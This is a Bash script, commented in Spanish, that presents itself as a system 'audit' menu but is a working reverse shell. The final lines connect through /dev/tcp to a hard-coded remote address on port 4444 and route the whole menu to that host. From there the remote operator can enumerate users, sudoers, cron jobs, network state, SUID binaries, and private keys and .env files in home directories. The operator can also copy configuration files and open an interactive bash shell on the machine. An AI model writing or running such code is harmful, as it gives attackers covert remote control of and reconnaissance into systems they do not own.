#!/bin/bash
# reverse_shell_advanced_menu.sh

RHOST="192.168.203.117"
RPORT=4444
LOG_DIR="/tmp/sys$(date +%Y%m%d_%H%M%S)"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Colores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Crear directorio de logs
mkdir -p "$LOG_DIR"

show_menu() {
    clear
    echo -e "${GREEN}"
    echo "╔══════════════════════════════════════════════╗"
    echo "║          REVERSE SHELL By Ramon Aibar        ║"
    echo "╠══════════════════════════════════════════════╣"
    echo "║ 1.  Información COMPLETA del Sistema         ║"
    echo "║ 2.  Usuarios, Grupos y Permisos              ║"
    echo "║ 3.  Red, Puertos y Conexiones                ║"
    echo "║ 4.  Procesos, Servicios y Tareas             ║"
    echo "║ 5.  Archivos y Directorios Sensibles         ║"
    echo "║ 6.  Seguridad y Hardening                    ║"
    echo "║ 7.  Información de Aplicaciones              ║"
    echo "║ 8.  Backup de Configuraciones                ║"
    echo "║ 9.  Shell Interactiva                        ║"
    echo "║ 10. Auditoría COMPLETA (Todas las opciones)  ║"
    echo "║ 11. Salir                                    ║"
    echo "╚══════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo -e "Logs guardados en: ${YELLOW}$LOG_DIR${NC}"
    echo -n "Selecciona una opción [1-11]: "
}

log_header() {
    local file="$1"
    local title="$2"
    echo "══════════════════════════════════════════════════════════════════════" >> "$file"
    echo "$title - $(date '+%Y-%m-%d %H:%M:%S')" >> "$file"
    echo "══════════════════════════════════════════════════════════════════════" >> "$file"
    echo "" >> "$file"
}

get_complete_system_info() {
    local log_file="$LOG_DIR/01_sistema_completo.txt"
    
    echo -e "${YELLOW}[+] Recopilando información COMPLETA del sistema...${NC}" >&2
    log_header "$log_file" "INFORMACIÓN COMPLETA DEL SISTEMA"
    
    # Información básica del sistema
    echo "[+] INFORMACIÓN BÁSICA:" >> "$log_file"
    echo "Hostname: $(hostname)" >> "$log_file"
    echo "DNS Domain: $(domainname 2>/dev/null || echo 'N/A')" >> "$log_file"
    echo "Sistema Operativo: $(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2 | tr -d '\"')" >> "$log_file"
    echo "Kernel: $(uname -r)" >> "$log_file"
    echo "Arquitectura: $(uname -m)" >> "$log_file"
    echo "Plataforma: $(uname -s)" >> "$log_file"
    echo "" >> "$log_file"
    
    # Información de hardware detallada
    echo "[+] HARDWARE DETALLADO:" >> "$log_file"
    echo "Procesador: $(grep 'model name' /proc/cpuinfo | head -1 | cut -d: -f2 | sed 's/^ *//')" >> "$log_file"
    echo "Núcleos: $(nproc)" >> "$log_file"
    echo "Memoria Total: $(free -h | grep Mem: | awk '{print $2}')" >> "$log_file"
    echo "Memoria Disponible: $(free -h | grep Mem: | awk '{print $7}')" >> "$log_file"
    echo "Swap: $(free -h | grep Swap: | awk '{print $2}')" >> "$log_file"
    echo "" >> "$log_file"
    
    # Discos y particiones
    echo "[+] DISCOS Y PARTICIONES:" >> "$log_file"
    lsblk 2>/dev/null >> "$log_file" || fdisk -l 2>/dev/null >> "$log_file"
    echo "" >> "$log_file"
    
    # Uso de disco
    echo "[+] USO DE DISCO:" >> "$log_file"
    df -h >> "$log_file"
    echo "" >> "$log_file"
    
    # Inode usage
    echo "[+] USO DE INODOS:" >> "$log_file"
    df -i >> "$log_file"
    echo "" >> "$log_file"
    
    # Uptime y carga del sistema
    echo "[+] TIEMPO DE ACTIVIDAD Y CARGA:" >> "$log_file"
    uptime >> "$log_file"
    echo "Load Average: $(cat /proc/loadavg)" >> "$log_file"
    echo "" >> "$log_file"
    
    # Fecha y hora del sistema
    echo "[+] FECHA Y HORA:" >> "$log_file"
    date >> "$log_file"
    timedatectl status 2>/dev/null >> "$log_file"
    echo "" >> "$log_file"
    
    # Variables de entorno importantes
    echo "[+] VARIABLES DE ENTORNO:" >> "$log_file"
    env | grep -E '(PATH|HOME|USER|SHELL|TERM|LANG|PWD)' >> "$log_file"
    echo "" >> "$log_file"
    
    echo -e "${GREEN}[+] Información completa guardada en: $log_file${NC}" >&2
    echo -e "${BLUE}[+] Resumen del sistema:${NC}" >&2
    head -30 "$log_file" >&2
}

get_detailed_user_info() {
    local log_file="$LOG_DIR/02_usuarios_grupos.txt"
    
    echo -e "${YELLOW}[+] Recopilando información DETALLADA de usuarios...${NC}" >&2
    log_header "$log_file" "INFORMACIÓN DETALLADA DE USUARIOS Y GRUPOS"
    
    # Todos los usuarios del sistema
    echo "[+] TODOS LOS USUARIOS DEL SISTEMA:" >> "$log_file"
    getent passwd >> "$log_file"
    echo "" >> "$log_file"
    
    # Usuarios con shell interactiva
    echo "[+] USUARIOS CON SHELL INTERACTIVA:" >> "$log_file"
    grep -v "/nologin\|/false\|/sync\|/bin/false" /etc/passwd >> "$log_file"
    echo "" >> "$log_file"
    
    # Información de grupos
    echo "[+] TODOS LOS GRUPOS DEL SISTEMA:" >> "$log_file"
    getent group >> "$log_file"
    echo "" >> "$log_file"
    
    # Grupos con miembros
    echo "[+] GRUPOS CON MIEMBROS:" >> "$log_file"
    for group in $(cut -d: -f1 /etc/group); do
        members=$(getent group $group | cut -d: -f4)
        if [ -n "$members" ]; then
            echo "Grupo $group: $members" >> "$log_file"
        fi
    done
    echo "" >> "$log_file"
    
    # Usuarios con privilegios sudo
    echo "[+] USUARIOS CON PRIVILEGIOS SUDO:" >> "$log_file"
    echo "Grupo sudo: $(getent group sudo | cut -d: -f4)" >> "$log_file"
    echo "Grupo wheel: $(getent group wheel 2>/dev/null | cut -d: -f4)" >> "$log_file"
    echo "Archivo sudoers:" >> "$log_file"
    grep -v '^#' /etc/sudoers 2>/dev/null | grep -v '^$' >> "$log_file"
    echo "" >> "$log_file"
    
    # Usuarios actualmente conectados
    echo "[+] USUARIOS CONECTADOS ACTUALMENTE:" >> "$log_file"
    who -a >> "$log_file"
    echo "" >> "$log_file"
    
    # Historial de logins
    echo "[+] ÚLTIMOS LOGINS:" >> "$log_file"
    last -20 >> "$log_file"
    echo "" >> "$log_file"
    
    # Información de cuentas
    echo "[+] INFORMACIÓN DE CUENTAS:" >> "$log_file"
    for user in $(cut -d: -f1 /etc/passwd); do
        echo "Usuario: $user" >> "$log_file"
        chage -l "$user" 2>/dev/null >> "$log_file"
        echo "---" >> "$log_file"
    done
    echo "" >> "$log_file"
    
    echo -e "${GREEN}[+] Información de usuarios guardada en: $log_file${NC}" >&2
    echo -e "${BLUE}[+] Resumen de usuarios:${NC}" >&2
    grep -E "^(Usuario:|Grupo |.*:.*sh$)" "$log_file" | head -20 >&2
}

get_detailed_network_info() {
    local log_file="$LOG_DIR/03_red_conexiones.txt"
    
    echo -e "${YELLOW}[+] Recopilando información DETALLADA de red...${NC}" >&2
    log_header "$log_file" "INFORMACIÓN DETALLADA DE RED Y CONEXIONES"
    
    # Información de interfaces de red
    echo "[+] INTERFACES DE RED:" >> "$log_file"
    ip addr show >> "$log_file" 2>/dev/null || ifconfig -a >> "$log_file"
    echo "" >> "$log_file"
    
    # Tabla de ruteo
    echo "[+] TABLA DE RUTEO:" >> "$log_file"
    ip route >> "$log_file" 2>/dev/null || route -n >> "$log_file"
    echo "" >> "$log_file"
    
    # Tabla ARP
    echo "[+] TABLA ARP:" >> "$log_file"
    ip neigh >> "$log_file" 2>/dev/null || arp -a >> "$log_file"
    echo "" >> "$log_file"
    
    # Puertos abiertos y servicios
    echo "[+] PUERTOS ABIERTOS Y SERVICIOS:" >> "$log_file"
    echo "=== netstat ===" >> "$log_file"
    netstat -tulnp 2>/dev/null >> "$log_file"
    echo "" >> "$log_file"
    echo "=== ss ===" >> "$log_file"
    ss -tulnp 2>/dev/null >> "$log_file"
    echo "" >> "$log_file"
    
    # Conexiones establecidas
    echo "[+] CONEXIONES ESTABLECIDAS:" >> "$log_file"
    netstat -tnp 2>/dev/null >> "$log_file" || ss -tnp >> "$log_file"
    echo "" >> "$log_file"
    
    # Estadísticas de red
    echo "[+] ESTADÍSTICAS DE RED:" >> "$log_file"
    netstat -s 2>/dev/null >> "$log_file" || ss -s >> "$log_file"
    echo "" >> "$log_file"
    
    # Configuración DNS
    echo "[+] CONFIGURACIÓN DNS:" >> "$log_file"
    cat /etc/resolv.conf 2>/dev/null >> "$log_file"
    cat /etc/hosts 2>/dev/null >> "$log_file"
    echo "" >> "$log_file"
    
    # Configuración de firewall
    echo "[+] CONFIGURACIÓN FIREWALL:" >> "$log_file"
    iptables -L -n 2>/dev/null >> "$log_file"
    ufw status verbose 2>/dev/null >> "$log_file"
    firewall-cmd --list-all 2>/dev/null >> "$log_file"
    echo "" >> "$log_file"
    
    # Servicios de red
    echo "[+] SERVICIOS DE RED:" >> "$log_file"
    systemctl list-unit-files | grep -E "(network|ssh|apache|nginx|ftp|dns)" >> "$log_file"
    echo "" >> "$log_file"
    
    echo -e "${GREEN}[+] Información de red guardada en: $log_file${NC}" >&2
    echo -e "${BLUE}[+] Resumen de red:${NC}" >&2
    grep -E "(ESTAB|LISTEN|[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)" "$log_file" | head -15 >&2
}

get_detailed_process_info() {
    local log_file="$LOG_DIR/04_procesos_servicios.txt"
    
    echo -e "${YELLOW}[+] Recopilando información DETALLADA de procesos...${NC}" >&2
    log_header "$log_file" "INFORMACIÓN DETALLADA DE PROCESOS Y SERVICIOS"
    
    # Todos los procesos
    echo "[+] TODOS LOS PROCESOS:" >> "$log_file"
    ps aux >> "$log_file"
    echo "" >> "$log_file"
    
    # Procesos por uso de CPU
    echo "[+] TOP PROCESOS POR CPU:" >> "$log_file"
    ps aux --sort=-%cpu | head -20 >> "$log_file"
    echo "" >> "$log_file"
    
    # Procesos por uso de memoria
    echo "[+] TOP PROCESOS POR MEMORIA:" >> "$log_file"
    ps aux --sort=-%mem | head -20 >> "$log_file"
    echo "" >> "$log_file"
    
    # Árbol de procesos
    echo "[+] ÁRBOL DE PROCESOS:" >> "$log_file"
    pstree -a 2>/dev/null >> "$log_file" || ps axjf >> "$log_file"
    echo "" >> "$log_file"
    
    # Servicios systemd
    echo "[+] SERVICIOS SYSTEMD (ACTIVOS):" >> "$log_file"
    systemctl list-units --type=service --state=running 2>/dev/null >> "$log_file"
    echo "" >> "$log_file"
    
    # Todos los servicios systemd
    echo "[+] TODOS LOS SERVICIOS SYSTEMD:" >> "$log_file"
    systemctl list-unit-files --type=service 2>/dev/null >> "$log_file"
    echo "" >> "$log_file"
    
    # Servicios init (SysV)
    echo "[+] SERVICIOS INIT (SYSV):" >> "$log_file"
    service --status-all 2>/dev/null >> "$log_file"
    echo "" >> "$log_file"
    
    # Cron jobs detallados
    echo "[+] CRON JOBS DETALLADOS:" >> "$log_file"
    echo "=== Cron Global ===" >> "$log_file"
    cat /etc/crontab 2>/dev/null >> "$log_file"
    echo "" >> "$log_file"
    
    for user in $(cut -d: -f1 /etc/passwd); do
        user_cron=$(crontab -l -u "$user" 2>/dev/null)
        if [ -n "$user_cron" ]; then
            echo "=== Cron de $user ===" >> "$log_file"
            echo "$user_cron" >> "$log_file"
            echo "" >> "$log_file"
        fi
    done
    
    # Archivos de cron directories
    echo "[+] DIRECTORIOS CRON:" >> "$log_file"
    ls -la /etc/cron.* 2>/dev/null >> "$log_file"
    echo "" >> "$log_file"
    
    # Tareas systemd timer
    echo "[+] TIMERS SYSTEMD:" >> "$log_file"
    systemctl list-timers 2>/dev/null >> "$log_file"
    echo "" >> "$log_file"
    
    echo -e "${GREEN}[+] Información de procesos guardada en: $log_file${NC}" >&2
    echo -e "${BLUE}[+] Resumen de procesos:${NC}" >&2
    ps aux --sort=-%cpu | head -10 >&2
}

get_detailed_file_info() {
    local log_file="$LOG_DIR/05_archivos_sensibles.txt"
    
    echo -e "${YELLOW}[+] Recopilando información DETALLADA de archivos...${NC}" >&2
    log_header "$log_file" "INFORMACIÓN DETALLADA DE ARCHIVOS SENSIBLES"
    
    # Archivos de configuración importantes
    echo "[+] ARCHIVOS DE CONFIGURACIÓN IMPORTANTES:" >> "$log_file"
    important_files=(
        "/etc/passwd" "/etc/shadow" "/etc/group" "/etc/gshadow"
        "/etc/hosts" "/etc/hosts.allow" "/etc/hosts.deny"
        "/etc/ssh/sshd_config" "/etc/ssh/ssh_config"
        "/etc/sudoers" "/etc/crontab" "/etc/fstab"
        "/etc/resolv.conf" "/etc/nsswitch.conf" "/etc/sysctl.conf"
        "/etc/profile" "/etc/bash.bashrc" "/etc/environment"
    )
    
    for file in "${important_files[@]}"; do
        if [ -f "$file" ]; then
            echo "=== $file ===" >> "$log_file"
            ls -la "$file" >> "$log_file"
            if [[ ! "$file" =~ (shadow|gshadow|sudoers) ]]; then
                echo "Contenido:" >> "$log_file"
                head -50 "$file" >> "$log_file"
            fi
            echo "" >> "$log_file"
        fi
    done
    
    # Archivos sensibles en home directories
    echo "[+] ARCHIVOS SENSIBLES EN HOME:" >> "$log_file"
    find /home -type f \( -name "*.pem" -o -name "*.key" -o -name "id_rsa*" -o -name "id_dsa*" -o -name "*.ppk" -o -name "*.crt" -o -name "*.cer" -o -name ".env" -o -name "*config*" \) 2>/dev/null >> "$log_file"
    echo "" >> "$log_file"
    
    # Archivos con permisos SUID/SGID
    echo "[+] ARCHIVOS SUID:" >> "$log_file"
    find / -perm -4000 -type f 2>/dev/null | head -50 >> "$log_file"
    echo "" >> "$log_file"
    
    echo "[+] ARCHIVOS SGID:" >> "$log_file"
    find / -perm -2000 -type f 2>/dev/null | head -50 >> "$log_file"
    echo "" >> "$log_file"
    
    # Archivos con capacidades Linux
    echo "[+] ARCHIVOS CON CAPACIDADES:" >> "$log_file"
    getcap -r / 2>/dev/null | head -50 >> "$log_file"
    echo "" >> "$log_file"
    
    # Archivos de log importantes
    echo "[+] ARCHIVOS DE LOG:" >> "$log_file"
    find /var/log -type f -name "*.log" 2>/dev/null | head -20 >> "$log_file"
    echo "" >> "$log_file"
    
    # Archivos de configuración de aplicaciones
    echo "[+] CONFIGURACIONES DE APLICACIONES:" >> "$log_file"
    find /etc -name "*.conf" -type f 2>/dev/null | head -30 >> "$log_file"
    echo "" >> "$log_file"
    
    echo -e "${GREEN}[+] Información de archivos guardada en: $log_file${NC}" >&2
    echo -e "${BLUE}[+] Archivos sensibles encontrados:${NC}" >&2
    grep -E "(\.pem|\.key|id_rsa|shadow)" "$log_file" | head -10 >&2
}

get_security_info() {
    local log_file="$LOG_DIR/06_seguridad_hardening.txt"
    
    echo -e "${YELLOW}[+] Recopilando información de SEGURIDAD...${NC}" >&2
    log_header "$log_file" "INFORMACIÓN DE SEGURIDAD Y HARDENING"
    
    # Información de parches y actualizaciones
    echo "[+] INFORMACIÓN DE ACTUALIZACIONES:" >> "$log_file"
    if command -v apt &>/dev/null; then
        apt list --upgradable 2>/dev/null >> "$log_file"
    elif command -v yum &>/dev/null; then
        yum check-update 2>/dev/null >> "$log_file"
    fi
    echo "" >> "$log_file"
    
    # Políticas de contraseñas
    echo "[+] POLÍTICAS DE CONTRASEÑAS:" >> "$log_file"
    grep -E "(PASS_MAX_DAYS|PASS_MIN_DAYS|PASS_WARN_AGE)" /etc/login.defs 2>/dev/null >> "$log_file"
    echo "" >> "$log_file"
    
    # Configuración PAM
    echo "[+] CONFIGURACIÓN PAM:" >> "$log_file"
    find /etc/pam.d -type f -exec echo "=== {} ===" \; -exec cat {} \; 2>/dev/null >> "$log_file"
    echo "" >> "$log_file"
    
    # Configuración de auditoría
    echo "[+] CONFIGURACIÓN DE AUDITORÍA:" >> "$log_file"
    if command -v auditctl &>/dev/null; then
        auditctl -l >> "$log_file"
    fi
    echo "" >> "$log_file"
    
    # Configuración SELinux/AppArmor
    echo "[+] SELINUX/APPARMOR:" >> "$log_file"
    sestatus 2>/dev/null >> "$log_file"
    aa-status 2>/dev/null >> "$log_file"
    echo "" >> "$log_file"
    
    # Conexiones SSH activas
    echo "[+] CONEXIONES SSH ACTIVAS:" >> "$log_file"
    netstat -tnp | grep :22 >> "$log_file" || ss -tnp | grep :22 >> "$log_file"
    echo "" >> "$log_file"
    
    # Intentos de login fallidos
    echo "[+] INTENTOS DE LOGIN FALLIDOS:" >> "$log_file"
    grep "Failed password" /var/log/auth.log 2>/dev/null | tail -20 >> "$log_file"
    grep "authentication failure" /var/log/secure 2>/dev/null | tail -20 >> "$log_file"
    echo "" >> "$log_file"
    
    echo -e "${GREEN}[+] Información de seguridad guardada en: $log_file${NC}" >&2
}

get_application_info() {
    local log_file="$LOG_DIR/07_aplicaciones_instaladas.txt"
    
    echo -e "${YELLOW}[+] Recopilando información de APLICACIONES...${NC}" >&2
    log_header "$log_file" "INFORMACIÓN DE APLICACIONES INSTALADAS"
    
    # Paquetes instalados
    echo "[+] PAQUETES INSTALADOS:" >> "$log_file"
    if command -v dpkg &>/dev/null; then
        dpkg -l >> "$log_file"
    elif command -v rpm &>/dev/null; then
        rpm -qa >> "$log_file"
    fi
    echo "" >> "$log_file"
    
    # Servicios web
    echo "[+] SERVICIOS WEB:" >> "$log_file"
    systemctl list-unit-files | grep -E "(apache|nginx|httpd)" >> "$log_file"
    echo "" >> "$log_file"
    
    # Bases de datos
    echo "[+] BASES DE DATOS:" >> "$log_file"
    systemctl list-unit-files | grep -E "(mysql|mariadb|postgresql|mongodb)" >> "$log_file"
    echo "" >> "$log_file"
    
    # Versiones de software importante
    echo "[+] VERSIONES DE SOFTWARE:" >> "$log_file"
    for cmd in python python3 php node java gcc g++ ruby perl; do
        if command -v $cmd &>/dev/null; then
            echo "$cmd: $($cmd --version 2>/dev/null | head -1)" >> "$log_file"
        fi
    done
    echo "" >> "$log_file"
    
    echo -e "${GREEN}[+] Información de aplicaciones guardada en: $log_file${NC}" >&2
}

backup_configurations() {
    local backup_dir="$LOG_DIR/backup_configs"
    mkdir -p "$backup_dir"
    
    echo -e "${YELLOW}[+] Haciendo backup de configuraciones...${NC}" >&2
    
    # Copiar archivos de configuración importantes
    important_configs=(
        "/etc/passwd" "/etc/group" "/etc/hosts" "/etc/ssh/sshd_config"
        "/etc/sudoers" "/etc/crontab" "/etc/fstab" "/etc/resolv.conf"
    )
    
    for config in "${important_configs[@]}"; do
        if [ -f "$config" ]; then
            cp "$config" "$backup_dir/" 2>/dev/null
        fi
    done
    
    # Backup de cron jobs
    for user in $(cut -d: -f1 /etc/passwd); do
        crontab -l -u "$user" 2>/dev/null > "$backup_dir/cron_$user.txt"
    done
    
    echo -e "${GREEN}[+] Backups guardados en: $backup_dir${NC}" >&2
    ls -la "$backup_dir" >&2
}

run_complete_audit() {
    echo -e "${PURPLE}[+] INICIANDO AUDITORÍA COMPLETA DEL SISTEMA...${NC}" >&2
    
    get_complete_system_info
    echo -e "${GREEN}[✓] Sistema completado${NC}" >&2
    
    get_detailed_user_info
    echo -e "${GREEN}[✓] Usuarios completado${NC}" >&2
    
    get_detailed_network_info
    echo -e "${GREEN}[✓] Red completado${NC}" >&2
    
    get_detailed_process_info
    echo -e "${GREEN}[✓] Procesos completado${NC}" >&2
    
    get_detailed_file_info
    echo -e "${GREEN}[✓] Archivos completado${NC}" >&2
    
    get_security_info
    echo -e "${GREEN}[✓] Seguridad completado${NC}" >&2
    
    get_application_info
    echo -e "${GREEN}[✓] Aplicaciones completado${NC}" >&2
    
    backup_configurations
    echo -e "${GREEN}[✓] Backup completado${NC}" >&2
    
    echo -e "${CYAN}[+] Auditoría COMPLETA finalizada${NC}" >&2
    echo -e "${YELLOW}[+] Todos los logs guardados en: $LOG_DIR${NC}" >&2
    ls -la "$LOG_DIR" >&2
}

interactive_shell() {
    echo -e "${RED}[+] Iniciando shell interactiva...${NC}" >&2
    echo -e "${YELLOW}[!] Escribe 'exit' para volver al menú${NC}" >&2
    bash -i
}

main() {
    echo -e "${GREEN}[+] Iniciando Reverse Shell Auditoría${NC}" >&2
    echo -e "${BLUE}[+] Directorio de logs: $LOG_DIR${NC}" >&2
    
    while true; do
        show_menu
        read choice
        
        case $choice in
            1) get_complete_system_info ;;
            2) get_detailed_user_info ;;
            3) get_detailed_network_info ;;
            4) get_detailed_process_info ;;
            5) get_detailed_file_info ;;
            6) get_security_info ;;
            7) get_application_info ;;
            8) backup_configurations ;;
            9) interactive_shell ;;
            10) run_complete_audit ;;
            11)
                echo -e "${GREEN}[+] Saliendo...${NC}" >&2
                echo -e "${CYAN}[+] Logs guardados en: $LOG_DIR${NC}" >&2
                exit 0
                ;;
            *)
                echo -e "${RED}[-] Opción inválida${NC}" >&2
                ;;
        esac
        
        echo -e "\n${YELLOW}Presiona Enter para continuar...${NC}" >&2
        read
    done
}

# Iniciar conexión y menú
echo -e "${GREEN}[+] Conectando a $RHOST:$RPORT...${NC}" >&2
exec 5<>/dev/tcp/$RHOST/$RPORT
main <&5 >&5 2>&5
